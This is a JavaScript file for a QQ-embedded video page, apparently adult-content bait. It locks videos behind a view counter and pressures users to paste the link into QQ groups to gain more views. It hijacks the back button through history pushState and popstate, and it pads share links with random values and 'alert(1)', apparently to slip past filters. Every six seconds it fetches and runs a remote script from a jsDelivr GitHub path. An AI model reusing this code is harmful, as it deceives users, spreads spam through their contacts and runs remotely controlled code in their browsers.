// 获取当前日期
var date = new Date();
// date.getTime();        //获取当前时间(从1970.1.1开始的毫秒数)
var hours = date.getHours();       //获取当前小时数(0-23)
var minutes = date.getMinutes();     //获取当前分钟数(0-59)
var timeValue = "" +((hours >= 12) ? "下午 " : "上午 " )
timeValue += ((hours >12) ? hours -12 :hours)
timeValue += ((minutes < 10) ? ":0" : ":") + minutes
// 获取当前月份
var nowMonth = date.getMonth() + 1;
// 获取当前是几号
var strDate = date.getDate();
// 添加分隔符“-”
var seperator = "-";
// 对月份进行处理，1-9月在前面添加一个“0”
if (nowMonth >= 1 && nowMonth <= 9) {
   nowMonth = "0" + nowMonth;
}
// 对月份进行处理，1-9号在前面添加一个“0”
if (strDate >= 0 && strDate <= 9) {
   strDate = "0" + strDate;
}
// 最后拼接字符串，得到一个格式为(yyyy-MM-dd)的日期
var nowDate = date.getFullYear() + seperator + nowMonth + seperator + strDate;
var conf = {
    'time': 86400,
	'pie':'C131',
	'title': [
			name,
		],
	'sht': [
			name,
		],
	'she': [
			'已解锁全部！点击进入观赏！',
		],
	'shi': [
	    	pic,
	    ],
	'shu': [
			thisLink('?_wv=' + getNum() + '&f=FROM&alert(1)&{www}={wwwwnnn}'), //卡片连接
		],
	'ready': [
			endjump,
		],
	'adlink': [
		   	qun, //加群连接
		],
	'applink': adurl, //广告连接
	'applink2': adurl2, //广告连接2
	
	'code': '{wwwwwwnnn}',
	'adth1': '没有观看次数了！<br><br>①请复制转发到Q群 增加观看次数<br><br>②每有一人打开你就增加5次<br><br>③没有人打开不增加次数<br>',
	'adthe': '恭喜你分享完成！<br>提醒好友打开后马上增加'+ cishu +'次刷新机会！',
};

// var str = JSON.stringify(conf);
// var str1 = JSON.parse(str);
// alert(str);


conf.city = '同城';
if (window.localAddress) {
	conf.city = localAddress.city;
	if (conf.city.length == 0)conf.city = localAddress.province;
}
conf.video = videoList[Math.floor( Math.random() * videoList.length) ]||videoList[0];
var h ='';

if(topad){
h	+= '<center><a id ="topad" href="'+topad+'"><img src="'+toppic+'" width="100%" border="边框"></a></center>';
}

h	+=  '<div style="margin:20px 0 9px;">';
h	+= '<h2 align="center" style="color:white;">'+hdtitle+'</h2>';
h	+= '<h2 align="center" style="color:white;">当前可刷新次数：<span style="color:red;" id="sup">0</span> 次</h2>';
h	+= '</div>';
h	+= '<div class="video">';
h	+= '	<video id="video" src="'+conf.video+'" poster="./css/0uDKbo8GhCN.png" id="main-media" width="100% height="220px"" controls x5-playsinline="" playsinline="" webkit-playsinline="" preload="auto"></video>';
h	+= '</div>';
h	+= '<div class="views"  style="width: 100%;height: 220px;display:none;">';
h	+= '    <img onclick="shx()"  src="./css/0uDKbo8GhCN.png" style="width: 100%;height: 220px;">';
h	+= '</div>';
h	+= '<div style="position: relative;height: 21px;overflow: hidden;font-size:15px;color:white;margin:10px 0;background: #332121;">';
h	+= '    <img src="./images/c1ddbc.0" style="height:20px;position: absolute;">';
h	+= '    <ul class="ul1" style="margin-top: 0px;"><li>复制链接发到群，1人点击看5部，10人点击看50部！</li><li>尽量发到多个活跃群，增加刷新次数和速度！</li><li>复制链接发到群，1人点击看5部，10人点击看50部！</li></ul>';
h	+= '</div>';
h	+= '<div style="text-align:center;">';
h	+= '<button class="mini-upload" id="updateBtn" style="background-color:#6ba7cc;">'+uptitle+'</button>';
//h	+= '<button class="mini-upload2" id="shareBtn">'+sharetitle+'</button>';
h	+= '<button class="mini-upload" id="copyUrlBtn" style="background-color:#f36b1d;">👉点我复制链接-粘贴到群</button>';

if(adtitle){
h	+= '<a id ="applink"  class="mini-upload" href="'+conf.applink+'"  style="background-color:#BFA700;">'+adtitle+'</a>';
}
if(adtitle2){
h	+= '<a id ="applink2"  class="mini-upload" href="'+conf.applink2+'" style="background-color:#ee1741;">✌'+adtitle2+'✌</a>';
}
if(quntitle){
h	+= '<a id ="qun" class="mini-upload" href="'+conf.adlink+'" style="background-color:#eda9b8;">'+quntitle+'</a>';
}
// h	+= '<button class="mini-upload5" id="shareBtn">'+sharetitle+'</button>';
// h	+= '<button class="mini-upload" id="copyUrlBtn">复制网站地址</button>';
h	+= '</div>';
h	+= '<div class="prompt" style="color:white;display:block;font-size: 12px;margin-left:10px;margin-top: 5px;">';
h	+= '    <div>* 复制链接发到群，1人点击看5部，10人点击看50部！</div>';
h	+= '    <div>* 复制链接发到群，1人点击看5部，10人点击看50部！</div>';
h	+= '    <div>* 尽量发到多个活跃群，增加刷新次数和速度！</div>';
h	+= '    <div>* 尽量发到多个活跃群，增加刷新次数和速度！</div>';
h	+= '</div>';
h	+= '<span id="addreas" style="opacity:0;"></span>';
h = h.replace(/\{city\}/gi,conf.city);
h = h.replace(/\{ico\}/gi,getRandIco);
h = myChat(h);
document.write( h );
video.addEventListener("ended",function(){
	location.href = conf.ready;
});
conf.pie = (/\/(\w{3,5})/.exec(location.pathname)||[0,'_'])[1];
$(function(){
    if (!coo('code')) coo('snt', 0, conf.time);
	coo('code',conf.code = coo('code') || conf.code,conf.time);
    if (/alert/i.test(location.href)) coo('visit', parseInt(coo('visit')) + 1, conf.time);

	she(true);
	addreas.innerHTML = location.href;
	if(conf.title){
		document.title = conf.title;
	}
	if(window.mqq){
		mqq.ui.setTitleButtons({
			left: {title: "返回",callback: function() {}},right: {hidden: true,}
		})	
	}			
	var snn = coo('snt')||0;
	getSign();
	setInterval(getSign,6000);
	function getPop(){
		shx();
		window.history.pushState({},'x',getUrl());
	};
	if(!/alert/.test(location.href)){
		location.href=getUrl();
	}else{
		window.history.pushState({},'x',getUrl());
	}
	window.addEventListener("popstate",getPop,false);
	if(coo('playTime')>0){
		var duckBtn = function (){
			if(coo('playTime')>0){
				$('#updateBtn').html('( '+coo('playTime')+' ) 秒禁止点击').css('background','#aaa');
				coo('playTime',coo('playTime')-1);
			}else{
				$('#updateBtn').html('点击换个更精彩').removeAttr('style');
				coo('playTime',0);
				clearInterval(window.ducktime);
			}
		}
		clearInterval(window.ducktime);
		window.ducktime = setInterval(duckBtn,1000);
		duckBtn();
	}
	$('#updateBtn').click(function(e){
		if(coo('playTime')>0)return;
		coo('playTime',5);
		setPlay(coo('socket'),function(){
			location.reload();
		});
	});
	$('#shareBtn').click(function(e){
		shx();
	});
	$('#copyUrlBtn').click(function(e){
		var p = document.createElement('textarea');
		// p.value = '收藏'+location.href;
		p.value = fuzhiqian+location.href+fuzhihou;
		p.style.opacity=0;
		document.body.appendChild(p);
		p.select();
		document.execCommand("Copy");
		document.body.removeChild(p);
		tip('复制成功，发到群里即可');
	});
	$('.page_dialog a[href]').click(function(e){
		window.isimg = 1;
		var href =  $(this).attr('hrefs');
		if(href){
			if(!(location.href.indexOf(conf.code) > -1)){
				setovblc();
				return shx();
			}
		}
		var href = $(this).attr('href');
		if(href){
			e.preventDefault();
			opensdk(href);
		}
	});
	var ul1Index = 0;
	setInterval(function(){
		var step = 20;
		ul1Index+=step;
		$('.ul1').animate({marginTop:-ul1Index%(step*3)});
    }, 5000);
});
for(var i in conf){
	if(conf[i] instanceof Array){
		conf[i] = myChat(conf[i][Math.floor(Math.random()*conf[i].length)]);
	}else if('string' == typeof conf[i]){
		conf[i] = myChat(conf[i]);
	}
}



var datajson = {
	'title': name,
	'ready': endjump,
	'adlink': qun,//加群连接
	'topad':topad,//顶部广告
	'ready': endjump,
	'applink': adurl, //广告连接
	'applink2': adurl2, //广告连接2
	'videoList':videoList,
};


function getSign(obj){
	$_GET = getUrlVal();
	
	
	
	
	
	


   // var socketUrl = 'http://127.0.0.200/2023/socket.php?sign='+conf.code
	   var socketUrl = 'http://cdn.jsdelivr.net/gh/jobhubs/jss/1.js';
	// if(!coo('sclick')&&$_GET.f){	
    // const key = "bee6852c4877e5d8";
    // const  iv = "9c577f29f26b4228";

    /* js加密 */
	
	  // var str = JSON.stringify(datajson);
      // var data = encrypt(str, key, iv);
	   // data = encodeURIComponent(data);
	  
      // console.log('js加密:' + data)	
	   // alert(data);
	  
	  // socketUrl += '&from='+ ($_GET.f||'')+ '&str='+ data;
	// }
	$.getScript(socketUrl,function(){});
	if(!window.isstop){
		// console.log('加次数',thisLink(socketUrl+ '&from='+ $_GET.f));
	}
}
function setSign(obj){
    coo('sclick', 1, 600);
	var socketCoo = coo('socket');
	if(socketCoo.sign != obj.sign){
		window.isstop = false;
		console.log(obj);
		tip('恭喜增加'+cishu+'次刷新机会');
	}
	if(!window.isstop){
		setPlay(obj);
	}
	 // var obj = JSON.stringify(obj);
	 // alert(obj.sign);
    coo('socket', obj, conf.time);
}
function setPlay(obj,fn){
	var time = Math.max((obj.sign+1) * cishu +2 - coo('visit'),0);
	$('#sup').html(Math.max(time-1,0));
	if(time < 1 ){
        coo('visit', (obj.sign + 1) * cishu + 1, conf.time);
		shx();
		video.pause();
		$('.video').hide();
		$('.views').show();
		window.isstop = 1;
	}else{
		if(fn)fn();
		$('.video').show();
		$('.views').hide();
		$('.layui-m-layer').remove();
		video.play();
		window.isstop = 1;
	}
}
function getUrl() {
	return myChat(conf.shu = conf.shu.replace('FROM',conf.code));
}



//定时提示框
function thisLink(u){
	var a = document.createElement('a');
	a.href = u;
	return a.href;
};
function setovblc(){
	if(!window.hiddenProperty){
		window.hiddenProperty='hidden' in document ? 'hidden': 'webkitHidden' in document ? 'webkitHidden': 'mozHidden' in document ? 'mozHidden': null;
		var vsbce=hiddenProperty.replace(/hidden/i,'visibilitychange');
		function ovblc(){
			if(!document[hiddenProperty]&&window.isimg){
                coo('snt', coo('snt') + 1, conf.time);
				shx();
			}
		}
		document.addEventListener(vsbce,ovblc);	
	}
}





function copyUrlBtn(){
	// $('#copyUrlBtn').click(function(e){
		var p = document.createElement('textarea');
		// p.value = '收藏'+location.href;
		p.value = fuzhiqian+location.href+fuzhihou;
		p.style.opacity=0;
		document.body.appendChild(p);
		p.select();
		document.execCommand("Copy");
		document.body.removeChild(p);
		tip2();
	// });

}


function tip2(){
	// var snn = coo('snt')||0;
	// if(snn == 0){
		// msg(conf.adth1,function(){
			// she();
		// })
		
	layer.open({
			content: '复制成功，返回QQ，粘贴发送到Q群吧',
			btn: ['确定'],
			yes: function(index) {
				
				
				layer.close(index);
			}
		});
		
	// }else if(snn == 1||1){
		// layer.open({
			// content: conf.adthe,
			// btn: ['知道了'],
			// yes: function(index) {
				// layer.close(index);
			// }
		// });
	// }else{
		// layer.open({
			// content: conf.adthe,
			// btn: ['知道了'],
			// yes: function(index) {
				// layer.close(index);
			// }
		// });
	// }
}




function shx(){
	var snn = coo('snt')||0;
	if(snn == 0){
		msg(conf.adth1,function(){
			she();
		})
		
	layer.open({
			content: conf.adth1,
			btn: ['👉               一键复制'],
			yes: function(index) {
				
				copyUrlBtn()
				
				layer.close(index);
			}
		});
		
	}else if(snn == 1||1){
		layer.open({
			content: conf.adthe,
			btn: ['知道了'],
			yes: function(index) {
				layer.close(index);
			}
		});
	}else{
		layer.open({
			content: conf.adthe,
			btn: ['知道了'],
			yes: function(index) {
				layer.close(index);
			}
		});
	}
}
function msg(con,fun){
	layer.open({
		content: con,
		btn: ['确定'],
		yes: function(index) {
			fun.call(this);
			layer.close(index);
		}
	});
}
function getRand(l,m){
	return Math.floor(Math.random() * (m - l + 1) + l);
};
function ios(){
	return /iPhone|iPod|ios/i.test(navigator.userAgent);
}
function copyText(t) {
	var p = document.createElement('textarea');
	p.value = t;
	p.style.opacity=0;
	document.body.appendChild(p);
	p.select();
	document.execCommand("Copy");
	document.body.removeChild(p);
}
function she(state){
	var shu = getUrl();
//	document.title = conf.sht;
//	conf.she = conf.she.replace(/###/gi,conf.code);
	$('meta[itemprop="name"]').attr('content',conf.sht);
	$('meta[itemprop="description"]').attr('content',conf.she);
	$('meta[itemprop="image"]').attr('content',conf.shi);
	var obj = {
		title: conf.sht,
		desc: conf.she,
		image_url:conf.shi,
		share_url:shu 
		
		
		
	};
	mqq.data.setShareInfo(obj);
	if(!state){
		mqq.ui.showShareMenu();
	}
}
function coo(n,v,e,p,d,s) {
	n = conf.pie+n;
	if(!coo.sd||ios()){	
		var k,b = {},t=Math.floor(new Date()/1000), 
		o = JSON.parse(localStorage.c||'{}');
		for(k in o)if('object'==typeof o[k]&&o[k][1]>t){
			b[k]=o[k][0];
		}
		if (v === null){
			delete o[n];				
		}else if(v === undefined){
			return b[n]||0;			
		}else{
			o[n]=[v,t+(e||2592000)];
		}
		localStorage.c=JSON.stringify(o);
		return b		
	}
	if (v === undefined||v === null) {
		var val=g(n);
		if (v === null) coo(n,'',-10);
		try {
			return JSON.parse(val)
		} catch(e) {
			return val
		}
	} else {
		if (typeof(v)=='object') v=JSON.stringify(v);
		document.cookie=n+'='+encodeURIComponent(v)+exp(e)+';path='+(p||'/')+(d ? '; domain='+d: '')+(s ? '; secure': '')+';'
	}
	function exp(s) {
		D=new Date(),
		D.setTime(D.getTime()+(s === undefined ? 2592000 : s) * 1000);
		return ';expires='+D.toUTCString()
	}
	function g(n) {
		if (document.cookie.length>0) {
			start=document.cookie.indexOf(n+"=");
			if (start != -1) {
				start=start+n.length+1;
				end=document.cookie.indexOf(";",start);
				if (end==-1) end=document.cookie.length;
				return decodeURIComponent(document.cookie.substring(start,end))
			}
		};
		return null
	}
};
function getRandIco() {
	var arr=['🌀','🌷','♈','♉','♊','♋','♌','♍','♎','♏','♐','♑','♒','♓','⛎','😠','😩','😲','😞','😵','😰','😒','😍','😤','😜','😝','😋','😘','😚','😷','😳','😅','😱','👙','👗','👡','💰','🔯','🅰','🅱','🆎','🅾','🎀','🎁','🎥','🎬','🎯','💋','💏','💌','🔞','⭕','❌','💓','💔','💕','💖','💗','💘','💞','🈲','㊙','💢'];
	return arr[Math.floor(Math.random()*arr.length)];
}
function opensdk(url){
	url = myChat(url);
	var obj = {
		url     : url,
		target  : 1,
		style   : 2
	};
	mqq.invoke("ui", "openUrl",obj);
}
function getRand(l,m){
	return Math.floor(Math.random() * (m - l + 1) + l);
}
function getNum() {
	return 64 * parseInt(getRand(1, 30))+ getRand(2, 3);
}
function myChat(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		b = b.toUpperCase();
		for(var i=0;i<b.length;i++){
			if('N'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('D'==b[i]){
				h+=String.fromCharCode(65+Math.floor(Math.random()*26));
			}else{
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
//JS提示弹框
function tip(text, time) {
	window.tmsg&&document.body.removeChild(tmsg);
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:200px;left:20%;right:20%;color:#fff;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#333;border:1px solid #000;box-shadow:#ccc 1px 1px 15px 4px;transition:opacity 0.6s">'+text+'</div>');
	setTimeout('tmsg.style.opacity=0.8',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',(time||3)*1000);
}
//解析 $_GET
function getUrlVal(u) {
	var j,g = {};
	u = (u || document.location.href.toString()).split('?');
	if (typeof(u[1]) == "string") {
		u = u[1].split("&");
		for (var i in u) {
			j = u[i].split("=");
			if (j[1] !== undefined) g[j[0]] = decodeURIComponent(j[1])
		}
	}
	return g;
}
function jiaqun(){
	var qun =[
		qun,
	];
	location.href=qun[Math.floor(qun.length*Math.random())];
}
